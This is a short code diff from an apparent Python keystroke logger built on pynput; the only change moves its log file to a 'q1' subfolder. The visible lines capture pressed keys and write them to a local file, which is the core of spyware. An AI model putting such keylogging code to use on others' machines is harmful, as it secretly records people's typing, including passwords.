@@ -6,7 +6,7 @@ from pynput.keyboard import Listener
 
 
 location = os.getcwd()
-fileLocation = location + '\log.txt'
+fileLocation = location + '\q1\log.txt'
 
 def registerPressedKeys(key):
     keyPressed = str(key)
